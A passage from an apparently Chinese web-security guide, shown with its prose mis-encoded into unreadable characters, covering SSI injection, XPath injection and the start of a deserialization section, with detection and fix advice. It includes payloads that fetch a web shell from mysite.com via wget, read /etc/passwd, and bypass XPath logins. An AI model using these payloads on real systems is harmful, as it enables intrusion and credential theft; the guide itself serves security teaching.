¹æ®æ‰€ä½¿ç”¨çš„æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼Œç”¨äºæ³¨å…¥<code>SSI</code>çš„å‘½ä»¤ä¼šæœ‰æ‰€ä¸åŒã€‚ä»¥ä¸‹å‘½ä»¤ä»£è¡¨åº”ç”¨äºæ‰§è¡Œ<code>OS</code>å‘½ä»¤çš„è¯­æ³•ã€‚</p><p>â€‹    <code>Linux</code>ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">åˆ—å‡ºç›®å½•æ–‡ä»¶ï¼š</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="ls" --&gt;</span></span><br><span class="line">è®¿é—®ç›®å½•ï¼š</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="cd /root/dir/"&gt;</span></span><br><span class="line"><span class="comment">è®¿é—®ç›®å½•ï¼š</span></span><br><span class="line"><span class="comment">&lt;!--#exec cmd="cd /root/dir/"&gt;</span></span><br><span class="line"><span class="comment">æ‰§è¡Œè„šæœ¬ï¼š</span></span><br><span class="line"><span class="comment">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    <code>Windows</code>ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åˆ—å‡ºç›®å½•æ–‡ä»¶ï¼š</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="dir" --&gt;</span></span><br><span class="line">è®¿é—®ç›®å½•ï¼š</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="cd C:\admin\dir"&gt;</span></span><br></pre></td></tr></table></figure><p>åœºæ™¯2ï¼š</p><p>â€‹    å¯ç”¨äºè®¿é—®å’Œè®¾ç½®æœåŠ¡å™¨ä¿¡æ¯çš„å…¶ä»–<code>SSI</code>ç¤ºä¾‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¦æ›´æ”¹é”™è¯¯æ¶ˆæ¯è¾“å‡ºï¼š</span><br><span class="line"><span class="comment">&lt;!--#config errmsg="File not found, informs users and password"--&gt;</span></span><br><span class="line">è¦æ˜¾ç¤ºå½“å‰æ–‡æ¡£çš„æ–‡ä»¶åï¼š</span><br><span class="line"><span class="comment">&lt;!--#echo var="DOCUMENT_NAME" --&gt;</span></span><br><span class="line">è¦æ˜¾ç¤ºè™šæ‹Ÿè·¯å¾„å’Œæ–‡ä»¶åï¼š</span><br><span class="line"><span class="comment">&lt;!--#echo var="DOCUMENT_URI" --&gt;</span></span><br><span class="line">ä½¿ç”¨â€œ configâ€å‘½ä»¤å’Œâ€œ timefmtâ€å‚æ•°ï¼Œå¯ä»¥æ§åˆ¶æ—¥æœŸå’Œæ—¶é—´è¾“å‡ºæ ¼å¼ï¼š</span><br><span class="line"><span class="comment">&lt;!--#config timefmt="A %B %d %Y %r"--&gt;</span></span><br><span class="line">ä½¿ç”¨â€œ fsizeâ€å‘½ä»¤ï¼Œå¯ä»¥æ‰“å°æ‰€é€‰æ–‡ä»¶çš„å¤§å°ï¼š</span><br><span class="line"><span class="comment">&lt;!--#fsize file="ssi.shtml" --&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>å‰ææ¡ä»¶ï¼š</p><p>æ”¯æŒæœåŠ¡å™¨ç«¯çš„<code>Web</code>æœåŠ¡å™¨åŒ…æ‹¬å¹¶å¯ç”¨äº†å®ƒä»¬ï¼Œç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥ï¼Œå¯ä»¥åŒ…å«<code>Web</code>æœåŠ¡å™¨çš„åŒ…å«æŒ‡ä»¤ã€‚</p><p>æŸ¥æ‰¾æµè¡Œçš„é¡µé¢æ–‡ä»¶åã€‚æ”»å‡»è€…å°†åœ¨URLä¸­å¯»æ‰¾<code>.shtml</code>ï¼Œ<code>.shtm</code>ï¼Œ<code>.asp</code>ï¼Œ<code>.aspx</code>å’Œå…¶ä»–çŸ¥åå­—ç¬¦ä¸²ï¼Œä»¥å¸®åŠ©ç¡®å®šæ˜¯å¦å¯ç”¨äº†<code>SSI</code>åŠŸèƒ½ã€‚</p><p>æå–<code>.htaccess</code>æ–‡ä»¶ã€‚åœ¨<code>Apache Web</code>æœåŠ¡å™¨å®‰è£…ä¸­ï¼Œ<code>.htaccess</code>æ–‡ä»¶å¯ä»¥åœ¨ç‰¹å®šä½ç½®å¯ç”¨æœåŠ¡å™¨ç«¯åŒ…å«ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œ<code>.htaccess</code>æ–‡ä»¶ä½äºå¯ç”¨<code>SSI</code>çš„ç›®å½•ä¸­ï¼Œå¹¶ä¸”ä»ç†è®ºä¸Šè®²å¯ä»¥ä»<code>Web</code>æœåŠ¡å™¨è·å–ã€‚å°½ç®¡å¤§å¤šæ•°<code>Web</code>æœåŠ¡å™¨éƒ½æ‹’ç»è·å–<code>.htaccess</code>æ–‡ä»¶ï¼Œä½†é…ç½®é”™è¯¯çš„æœåŠ¡å™¨å°†å…è®¸å®ƒã€‚</p><p>ä½¿ç”¨ä»£ç†å·¥å…·æ¥è·Ÿè¸ªå’Œè®°å½•æ‰€æœ‰é“¾æ¥ã€‚ç‰¹åˆ«æ³¨æ„<code>URL</code>ä¸­åŒ…å«å‚æ•°çš„ä»»ä½•é“¾æ¥ã€‚</p><p>ä½¿ç”¨ä»£ç†å·¥å…·è®°å½•åœ¨æ‰‹åŠ¨éå†<code>Web</code>åº”ç”¨ç¨‹åºæœŸé—´è®¿é—®çš„æ‰€æœ‰é“¾æ¥ã€‚ç‰¹åˆ«æ³¨æ„<code>URL</code>ä¸­åŒ…å«å‚æ•°çš„ä»»ä½•é“¾æ¥ã€‚ç»å¸¸éœ€è¦ä½¿ç”¨è¿™ç§ç±»å‹çš„æ‰‹åŠ¨éå†æ¥è¯†åˆ«å±äº<code>GET</code>æ–¹æ³•å½¢å¼è€Œä¸æ˜¯<code>POST</code>å½¢å¼çš„å½¢å¼ã€‚</p></li><li><p>å¸¸è§æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#echo var="DATE_LOCAL" --&gt;</span></span><br><span class="line">æ‰“å°å½“å‰æ—¶é—´ã€‚</span><br><span class="line"><span class="comment">&lt;!--#include virtual="/cgi-bin/counter.pl" --&gt;</span></span><br><span class="line">åŒ…æ‹¬CGIè„šæœ¬çš„è¾“å‡ºã€‚</span><br><span class="line"><span class="comment">&lt;!--#include virtual="/footer.html" --&gt;</span></span><br><span class="line">åœ¨ç›®å½•ä¸­åŒ…å«æ–‡ä»¶æˆ–åˆ—è¡¨æ–‡ä»¶çš„å†…å®¹ã€‚</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="ls" --&gt;</span></span><br><span class="line">åŒ…æ‹¬ç³»ç»Ÿå‘½ä»¤çš„è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°æ½œåœ¨çš„æ³¨å…¥ç‚¹åˆ—è¡¨åï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¾“å…¥æ˜¯å¦æ­£ç¡®éªŒè¯ï¼Œç„¶åæ‰¾å‡ºæ‰€æä¾›è¾“å…¥çš„å­˜å‚¨ä½ç½®ã€‚æˆ‘ä»¬éœ€è¦ç¡®ä¿å¯ä»¥æ³¨å…¥<code>SSI</code>æŒ‡ä»¤ä¸­ä½¿ç”¨çš„å­—ç¬¦ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt; ! # = <span class="string">/</span> <span class="attr">.</span> " <span class="attr">-</span> &gt;</span> and [a-zA-Z0-9]</span><br></pre></td></tr></table></figure></li></ul><p>  ä¸ºäº†æµ‹è¯•éªŒè¯æ˜¯å¦è¶³å¤Ÿï¼Œæˆ‘ä»¬å¯ä»¥ä»¥è¾“å…¥å½¢å¼è¾“å…¥ä¾‹å¦‚ä»¥ä¸‹å­—ç¬¦ä¸²ï¼š</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#include virtual="/etc/passwd"  --&gt;</span></span><br></pre></td></tr></table></figure><p>  å¦‚æœ<code>Web</code>åº”ç”¨ç¨‹åºå°†ä½¿ç”¨è¯¥æ•°æ®æ¥æ„å»ºåŠ¨æ€ç”Ÿæˆçš„é¡µé¢ï¼Œåˆ™ä¹Ÿå¯ä»¥åœ¨<code>HTTP</code>æ ‡å¤´ä¸­æ‰§è¡Œæ³¨å…¥ï¼š</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.0</span><br><span class="line">Referer: <span class="comment">&lt;!--#exec cmd="/bin/ps ax"--&gt;</span></span><br><span class="line">User-Agent: <span class="comment">&lt;!--#include virtual="/proc/version"--&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>åœ¨å…¨å±€<code>access.conf</code>æ–‡ä»¶æˆ–æœ¬åœ°<code>.htaccess</code>ï¼ˆ<code>Apache</code>ï¼‰æ–‡ä»¶ä¸­è®¾ç½®<code>OPTIONS IncludesNOEXEC</code>ï¼Œä»¥æ‹’ç»ä¸éœ€è¦å®ƒä»¬çš„ç›®å½•ä¸­çš„<code>SSI</code>æ‰§è¡Œã€‚</p></li><li><p>å¿…é¡»å¯¹æ‰€æœ‰ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥è¿›è¡Œé€‚å½“çš„è¿‡æ»¤ã€‚è¿™åŒ…æ‹¬çœç•¥æˆ–ç¼–ç æŸäº›å¯èƒ½è¢«è§£é‡Šä¸º<code>SSI</code>æŒ‡ä»¤ä¸€éƒ¨åˆ†çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²ã€‚</p></li><li><p>éå¿…è¦æƒ…å†µä¸‹å…³é—­â€œæœåŠ¡ç«¯åŒ…å«â€ã€‚</p></li></ul><h3 id="XPATHæ³¨å…¥"><a href="#XPATHæ³¨å…¥" class="headerlink" title="XPATHæ³¨å…¥"></a>XPATHæ³¨å…¥</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><p><code>XPath</code>æ˜¯ä¸€ç§ä¸»è¦ä¸ºè§£å†³<code>XML</code>æ–‡æ¡£çš„æŸäº›éƒ¨åˆ†è€Œè®¾è®¡å’Œå¼€å‘çš„è¯­è¨€ã€‚<code>XPath</code>æ³¨å…¥ä¸<code>SQL</code>æ³¨å…¥ç±»ä¼¼ï¼Œå½“ç½‘ç«™ä½¿ç”¨ç”¨æˆ·æä¾›çš„ä¿¡æ¯ä¸º<code>XML</code>æ•°æ®æ„é€ <code>XPath</code>æŸ¥è¯¢æ—¶ï¼Œå°±ä¼šå‘ç”Ÿ<code>XPath</code>æ³¨å…¥æ”»å‡»ã€‚é€šè¿‡å°†æ•…æ„æ ¼å¼é”™è¯¯çš„ä¿¡æ¯å‘é€åˆ°ç½‘ç«™ï¼Œæ”»å‡»è€…å¯ä»¥äº†è§£<code>XML</code>æ•°æ®çš„ç»“æ„ï¼Œæˆ–è®¿é—®ä»–ä»¬é€šå¸¸æ— æ³•è®¿é—®çš„æ•°æ®ã€‚</p></li><li><p><code>XML</code>çš„æŸ¥è¯¢æ˜¯é€šè¿‡<code>XPath</code>å®Œæˆçš„ï¼Œ<code>XPath</code>æ˜¯ä¸€ç§ç®€å•çš„æè¿°æ€§è¯­å¥ï¼Œå®ƒå…è®¸<code>XML</code>æŸ¥è¯¢æ‰¾åˆ°ä¸€æ¡ä¿¡æ¯ã€‚ä¸<code>SQL</code>ä¸€æ ·ï¼Œæ‚¨å¯ä»¥æŒ‡å®šè¦æŸ¥æ‰¾çš„æŸäº›å±æ€§ä»¥åŠè¦åŒ¹é…çš„æ¨¡å¼ã€‚åœ¨ç½‘ç«™ä¸Šä½¿ç”¨<code>XML</code>æ—¶ï¼Œé€šå¸¸ä¼šæ¥å—æŸ¥è¯¢å­—ç¬¦ä¸²çš„æŸç§å½¢å¼çš„è¾“å…¥ï¼Œä»¥æ ‡è¯†è¦å®šä½å¹¶æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„å†…å®¹ã€‚</p></li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>å¦‚æœå°†<code>XML</code>æ•°æ®ç”¨äºèº«ä»½éªŒè¯ï¼ˆä¾‹å¦‚ï¼ŒåŸºäº<code>XML</code>çš„ç”¨æˆ·æ–‡ä»¶ï¼‰ï¼Œä»–ä»¬ç”šè‡³å¯ä»¥åœ¨ç½‘ç«™ä¸Šæå‡ç‰¹æƒã€‚</p></li><li><p>æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæœªç»é€‚å½“çš„æˆæƒå°±ç»•è¿‡èº«ä»½éªŒè¯æœºåˆ¶æˆ–è®¿é—®ä¿¡æ¯ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šæˆ‘ä»¬å°†ä½¿ç”¨æ­¤<code>XML</code>ä»£ç æ®µä½œä¸ºç¤ºä¾‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">Employees</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">Employee</span> <span class="attr">ID</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">FirstName</span>&gt;</span>Arnold<span class="tag">&lt;/<span class="name">FirstName</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">LastName</span>&gt;</span>Baker<span class="tag">&lt;/<span class="name">LastName</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">UserName</span>&gt;</span>ABaker<span class="tag">&lt;/<span class="name">UserName</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Password</span>&gt;</span>SoSecret<span class="tag">&lt;/<span class="name">Password</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Type</span>&gt;</span>Admin<span class="tag">&lt;/<span class="name">Type</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">Employee</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">Employee</span> <span class="attr">ID</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">FirstName</span>&gt;</span>Peter<span class="tag">&lt;/<span class="name">FirstName</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">LastName</span>&gt;</span>Pan<span class="tag">&lt;/<span class="name">LastName</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">UserName</span>&gt;</span>PPan<span class="tag">&lt;/<span class="name">UserName</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Password</span>&gt;</span>NotTelling<span class="tag">&lt;/<span class="name">Password</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Type</span>&gt;</span>User<span class="tag">&lt;/<span class="name">Type</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">Employee</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Employees</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    å‡è®¾æˆ‘ä»¬åœ¨ç½‘é¡µä¸Šæœ‰ä¸€ä¸ªç”¨æˆ·èº«ä»½éªŒè¯ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿä½¿ç”¨è¿™ç§æ•°æ®æ–‡ä»¶æ¥ç™»å½•ç”¨æˆ·ã€‚æä¾›ç”¨æˆ·åå’Œå¯†ç åï¼Œè¯¥è½¯ä»¶å¯èƒ½ä¼šä½¿ç”¨<code>XPath</code>æŸ¥æ‰¾ç”¨æˆ·ï¼š</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VB:</span><br><span class="line"><span class="keyword">Dim</span> FindUserXPath <span class="keyword">as</span> <span class="built_in">String</span></span><br><span class="line">FindUserXPath = <span class="string">"//Employee[UserName/text()='"</span> &amp; Request(<span class="string">"Username"</span>) &amp; <span class="string">"' And</span></span><br><span class="line"><span class="string">        Password/text()='"</span> &amp; Request(<span class="string">"Password"</span>) &amp; <span class="string">"']"</span></span><br><span class="line"></span><br><span class="line">C<span class="meta">#:</span></span><br><span class="line"><span class="built_in">String</span> FindUserXPath;</span><br><span class="line">FindUserXPath = <span class="string">"//Employee[UserName/text()='"</span> + Request(<span class="string">"Username"</span>) + <span class="string">"' And</span></span><br><span class="line"><span class="string">        Password/text()='"</span> + Request(<span class="string">"Password"</span>) + <span class="string">"']"</span>;</span><br></pre></td></tr></table></figure><p>â€‹    ä½¿ç”¨æ™®é€šçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ­¤<code>XPath</code>å¯ä»¥å·¥ä½œï¼Œä½†æ˜¯æ”»å‡»è€…å¯èƒ½å‘é€é”™è¯¯çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶åœ¨ä¸çŸ¥é“ç”¨æˆ·åæˆ–å¯†ç çš„æƒ…å†µä¸‹é€‰æ‹©äº†<code>XML</code>èŠ‚ç‚¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Username: blah<span class="string">' or 1=1 or '</span>a<span class="string">'='</span>a</span><br><span class="line">Password: blah</span><br><span class="line">FindUserXPath becomes //Employee[UserName/text()=<span class="string">'blah'</span> or 1=1 or</span><br><span class="line">        <span class="string">'a'</span>=<span class="string">'a'</span> And Password/text()=<span class="string">'blah'</span>]</span><br><span class="line">Logically this is equivalent to:</span><br><span class="line">        //Employee[(UserName/text()=<span class="string">'blah'</span> or 1=1) or</span><br><span class="line">        (<span class="string">'a'</span>=<span class="string">'a'</span> And Password/text()=<span class="string">'blah'</span>)]</span><br></pre></td></tr></table></figure><p>â€‹    åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»…<code>XPath</code>çš„ç¬¬ä¸€éƒ¨åˆ†éœ€è¦ä¸ºçœŸã€‚å¯†ç éƒ¨åˆ†å˜å¾—æ— å…³ç´§è¦ï¼Œå¹¶ä¸”ç”±äºâ€œ <code>1 = 1</code>â€éƒ¨åˆ†ï¼Œç”¨æˆ·åéƒ¨åˆ†å°†ä¸æ‰€æœ‰å‘˜å·¥åŒ¹é…ã€‚</p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>åœ¨<code>XPath</code>æ³¨å…¥æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬æµ‹è¯•æ˜¯å¦å¯ä»¥å°†<code>XPath</code>è¯­æ³•æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºè§£é‡Šçš„è¯·æ±‚ä¸­ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ‰§è¡Œç”¨æˆ·æ§åˆ¶çš„<code>XPath</code>æŸ¥è¯¢ã€‚</p></li><li><p>å‡è®¾æˆ‘ä»¬çš„æ•°æ®åº“ç”±ä»¥ä¸‹XMLæ–‡ä»¶è¡¨ç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>gandalf<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>!c3<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">account</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>Stefan0<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>w1s3c<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">account</span>&gt;</span>guest<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>tony<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>Un6R34kb!e<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">account</span>&gt;</span>guest<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªè¿”å›ç”¨æˆ·å<code>gandalf</code>å’Œå¯†ç ä¸ºçš„å¸æˆ·çš„<code>XPath</code>æŸ¥è¯¢<code>!c3</code>å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())</span><br></pre></td></tr></table></figure><p>å¦‚æœåº”ç”¨ç¨‹åºæœªæ­£ç¡®è¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œåˆ™æµ‹è¯•äººå‘˜å°†èƒ½å¤Ÿæ³¨å…¥XPathä»£ç å¹¶å¹²æ‰°æŸ¥è¯¢ç»“æœã€‚ä¾‹å¦‚ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥è¾“å…¥ä»¥ä¸‹å€¼ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username: ' or '1' = '1  Password: ' or '1' = '1</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™äº›å‚æ•°ï¼ŒæŸ¥è¯¢å°†å˜ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(//user[username/text()='' or '1' =  '1' and password/text()='' or '1' = '1']/account/text())</span><br></pre></td></tr></table></figure><p>ä¸å¸¸è§çš„<code>SQL</code>æ³¨å…¥æ”»å‡»ä¸€æ ·ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªå§‹ç»ˆä¸º<code>true</code>çš„æŸ¥è¯¢ï¼Œè¿™æ„å‘³ç€å³ä½¿æœªæä¾›ç”¨æˆ·åæˆ–å¯†ç ï¼Œåº”ç”¨ç¨‹åºä¹Ÿå°†å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚ä¸ä½¿ç”¨<code>XPath</code>æ³¨å…¥çš„å¸¸è§<code>SQL</code>æ³¨å…¥æ”»å‡»ä¸€æ ·ï¼Œç¬¬ä¸€æ­¥æ˜¯åœ¨è¦æµ‹è¯•çš„å­—æ®µä¸­æ’å…¥<code>&#39;</code>(å•å¼•å·)ï¼Œåœ¨æŸ¥è¯¢ä¸­å¼•å…¥è¯­æ³•é”™è¯¯ï¼Œå¹¶æ£€æŸ¥åº”ç”¨ç¨‹åºæ˜¯å¦è¿”å›é”™è¯¯æ¶ˆæ¯ã€‚</p></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>å°±åƒé¿å…<code>SQL</code>æ³¨å…¥çš„æŠ€æœ¯ä¸€æ ·ï¼Œéœ€è¦ä½¿ç”¨å‚æ•°åŒ–çš„<code>XPath</code>æ¥å£ï¼Œæˆ–è€…è½¬ä¹‰ç”¨æˆ·è¾“å…¥ä»¥ä½¿å…¶å¯ä»¥å®‰å…¨åœ°åŒ…å«åœ¨åŠ¨æ€æ„é€ çš„æŸ¥è¯¢ä¸­ã€‚å¦‚æœä½¿ç”¨å¼•å·ç»ˆæ­¢åŠ¨æ€æ„é€ çš„<code>XPath</code>æŸ¥è¯¢ä¸­çš„ä¸å¯ä¿¡è¾“å…¥ï¼Œåˆ™éœ€è¦åœ¨ä¸å¯ä¿¡è¾“å…¥ä¸­è½¬ä¹‰è¯¥å¼•å·ï¼Œä»¥ç¡®ä¿ä¸å¯ä¿¡æ•°æ®ä¸èƒ½å°è¯•è„±ç¦»è¯¥å¼•ç”¨ä¸Šä¸‹æ–‡ã€‚åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œå•å¼•å·ï¼ˆ<code>&#39;</code>ï¼‰ç”¨äºç»ˆæ­¢<code>Username</code>å’Œ<code>Password</code>å‚æ•°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ç”¨è¯¥å­—ç¬¦çš„<code>XML</code>ç¼–ç ç‰ˆæœ¬ï¼ˆå³<code>â€œ&#39;â€</code>ï¼‰æ›¿æ¢æ­¤è¾“å…¥ä¸­çš„æ‰€æœ‰<code>&#39;</code>å­—ç¬¦ã€‚</p></li><li><p>ä½¿ç”¨é¢„ç¼–è¯‘çš„<code>XPATH</code>æŸ¥è¯¢ï¼Œé¢„ç¼–è¯‘çš„<code>XPath</code>æŸ¥è¯¢æ˜¯åœ¨ç¨‹åºæ‰§è¡Œå‰å·²ç»é¢„è®¾ã€‚</p></li></ul><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯æŒ‡ä»¥ä¸‹è¿‡ç¨‹ï¼šè·å–ç¨‹åºå†…éƒ¨ä¸å¯¹è±¡ç›¸å…³çš„æ•°æ®ï¼Œå°†å…¶æ‰“åŒ…ä»¥å…è®¸å°†æ•°æ®ä»å¤–éƒ¨å­˜å‚¨æˆ–ä¼ è¾“ï¼ˆâ€œåºåˆ—åŒ–â€ï¼‰ï¼Œç„¶åæå–åºåˆ—åŒ–çš„æ•°æ®ä»¥é‡å»ºåŸå§‹å¯¹è±¡ï¼ˆâ€œååºåˆ—åŒ–â€ï¼‰ã€‚</p></li><li><p>åºåˆ—åŒ–æ˜¯å°†æŸäº›å¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥ç¨åæ¢å¤çš„æ•°æ®æ 